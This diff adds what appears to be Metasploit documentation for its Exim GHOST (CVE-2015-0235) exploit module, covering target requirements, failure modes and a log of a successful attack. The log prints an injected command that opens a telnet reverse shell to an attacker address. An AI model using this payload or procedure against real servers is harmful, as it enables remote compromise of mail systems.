@@ -1,0 +1,148 @@
+I"� <p>The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys. On March 17th 2015, Qualys released an exploit module demonstrating the exploitability of this flaw, which is now exim_gethostbyname_bof.rb in Metasploit Framework.</p>
+
+<p>When Qualys released the exploit, it included a lot of technical details for debugging and usage purposes. We decided to put all that here in a more readable format.</p>
+
+<h2 id="what-is-ghost">What is “GHOST”</h2>
+
+<p>This is a heap based buffer overflow found in GNU C Library’s <strong>g</strong>et<strong>host</strong>byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu.</p>
+
+<h2 id="exploitable-requirements">Exploitable Requirements</h2>
+
+<p><strong>On the server-side (victim):</strong></p>
+
+<ul>
+  <li>glibc-2.6 - glibc-2.17: The exploit depends on the newer versions’ fd_nextsize (a member of the malloc_chunk structure) to remotely obtain the address of Exim’s smtp_cmd_buffer in the heap.</li>
+  <li>Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions’ 16-KB smtp_cmd_buffer to reliably set up the heap as described in the advisory.</li>
+  <li>The Exim server also must enable helo_try_verify_hosts or helo_verify_hosts in the /etc/exim4/exim4.conf.template file. The “verify = helo” ACL might be exploitable too, but the attack vector isn’t as reliable, therefore not supported by the module.</li>
+</ul>
+
+<p>For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server):
+http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso</p>
+
+<p><strong>On the attacker’s side:</strong></p>
+
+<ul>
+  <li>The attacker’s IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS).</li>
+</ul>
+
+<h2 id="the-check-method">The check method</h2>
+
+<p>The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not.</p>
+
+<p>The check is also enforced when you use the “exploit” or “run” command. However, you can turn off the enforcement by setting the <code class="highlighter-rouge">FORCE_EXPLOIT</code> datastore option to true. For example:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set FORCE_EXPLOIT true
+run
+</code></pre></div></div>
+
+<h2 id="troubleshooting">Troubleshooting</h2>
+
+<p>If the exim_gethostbyname_bof.rb module has failed on you:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Failure</th>
+      <th>Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (nil)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option was not specified</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (helo_verify_hosts)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim).</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (no FCrDNS)</td>
+      <td>the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS.</td>
+    </tr>
+    <tr>
+      <td>not vuln? old glibc? (no leaked_arch)</td>
+      <td>the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd_nextsize member in their malloc_chunk structure).</td>
+    </tr>
+    <tr>
+      <td>NUL, CR, LF in addr? (no leaked_addr)</td>
+      <td>Exim’s heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved).</td>
+    </tr>
+    <tr>
+      <td>Brute-force SUCCESS” followed by a nil reply, but no shell</td>
+      <td>the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc).</td>
+    </tr>
+    <tr>
+      <td>Brute-force SUCCESS” followed by a non-nil reply, and no shell</td>
+      <td>The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn’t exist, or awk isn’t gawk, or netcat doesn’t support the -6 or -e option, or telnet doesn’t support the -z option, etc).</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="module-demonstration">Module Demonstration</h2>
+
+<p>When everything is dialed in correctly, a successful attack should look like the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(exim_gethostbyname_bof) &gt; run
+
+[*] Started reverse double handler
+[*] Trying information leak...
+[!] {:heap_shift=&gt;736}
+[!] {:write_offset=&gt;128, :error=&gt;"503 sender not yet given"}
+[!] {:write_offset=&gt;136, :error=&gt;"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"}
+[!] {:error=&gt;["\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given", "", "503 \x89\x10", "177", "177\\177\\177", "vJN\\177\\177\\177\\177"]}
+[!] {:leaked_arch=&gt;"x86"}
+[!] {:count=&gt;{"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"=&gt;8, "hF\xFE\xB7hF\xFE\xB7er not yet given"=&gt;2}}
+[+] Successfully leaked_arch: x86
+[+] Successfully leaked_addr: b7fda760
+[*] Trying code execution...
+[!] ${run{/usr/bin/env setsid /bin/sh -c "sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 192.168.1.64 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)'"}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fda760", :offset=&gt;21}
+[!] {:reply=&gt;{:code=&gt;"250", :lines=&gt;["250 Accepted\r\n"]}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fda760", :offset=&gt;25}
+[!] {:reply=&gt;{:code=&gt;"250", :lines=&gt;["250 Accepted\r\n"]}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd8fd7", :offset=&gt;20}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd8fd7", :offset=&gt;8}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd784e", :offset=&gt;6}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd784e", :offset=&gt;12}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd60c5", :offset=&gt;19}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd60c5", :offset=&gt;29}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd493c", :offset=&gt;23}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd493c", :offset=&gt;18}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd31b3", :offset=&gt;14}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd31b3", :offset=&gt;3}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd1a2a", :offset=&gt;29}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd1a2a", :offset=&gt;28}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd02a1", :offset=&gt;26}
+[!] {:reply=&gt;{:code=&gt;"550", :lines=&gt;["550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\r\n"]}}
+[+] Brute-force SUCCESS
+[+] Please wait for reply...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo qaNpBmRBEus9XoVZ;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "qaNpBmRBEus9XoVZ\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500
+[!] {:reply=&gt;nil}
+
+id
+uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)
+</code></pre></div></div>
+
+<h2 id="references">References:</h2>
+
+<ul>
+  <li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235</li>
+  <li>https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit</li>
+  <li>https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159</li>
+  <li>https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159</li>
+</ul>
+:ET
